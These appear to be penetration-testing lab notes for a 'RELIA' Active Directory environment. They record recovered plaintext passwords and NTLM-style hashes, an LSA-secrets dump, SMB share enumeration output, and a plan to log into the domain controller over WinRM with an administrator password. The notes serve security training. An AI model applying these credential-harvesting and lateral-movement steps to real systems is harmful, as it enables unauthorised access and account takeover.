andrea:PasswordPassword_6:ce3f12443651168b3793f5fbcccff9db

Administrator::8b4547a5116dd13e6e206d1286a06b28


```sh
Secret  : _SC_SNMPTRAP / service 'SNMPTRAP' with username : RELIA\andrea
cur/text: PasswordPassword_6
old/text: jVmhsH4sbuVwP$2
```


On 172.16.x.21 as andrea:

```sh
SMB         172.16.130.21   445    FILES            [+] relia.com\andrea:PasswordPassword_6 
SMB         172.16.130.21   445    FILES            [+] Enumerated shares
SMB         172.16.130.21   445    FILES            Share           Permissions     Remark
SMB         172.16.130.21   445    FILES            -----           -----------     ------
SMB         172.16.130.21   445    FILES            ADMIN$                          Remote Admin
SMB         172.16.130.21   445    FILES            apps            READ            
SMB         172.16.130.21   445    FILES            C$                              Default share
SMB         172.16.130.21   445    FILES            IPC$            READ            Remote IPC
SMB         172.16.130.21   445    FILES            monitoring      READ            
SMB         172.16.130.21   445    FILES            scripts         READ 
```


We will take a look at scripts.help

Possible:
RELIA\Administrator:vau!XCKjNQBv2$ - We can WinRM in the DC with these credentials.